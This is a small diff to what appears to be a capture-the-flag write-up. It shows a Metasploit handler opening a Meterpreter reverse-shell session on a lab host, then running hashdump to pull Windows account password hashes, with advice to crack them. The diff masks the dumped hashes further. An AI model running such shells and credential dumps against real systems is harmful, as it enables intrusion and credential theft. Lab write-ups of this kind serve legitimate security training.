@@ -140,8 +140,8 @@ msf6 exploit(multi/handler) > exploit
 [*] Meterpreter session 1 opened (10.x.x.x:12345 -> 10.10.173.99:49500) at 2021-05-16 12:02:18 +1200
 
 meterpreter > hashdump
-Administrator:500:aad3b435xxxeeaad3b435b51404ee:549a1bcb88e35dc18cxxx68631411:::
-Guest:501:aad3b435bxxxeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0xxc0:::
+Administrator:500:xxxx:xxxx:::
+Guest:501:xxxx:xxxxxxx:::
 ```
 Just run `hashdump` after the shell connected. The hash between `:hash:::`is what you want to crack for. Job well done.
 
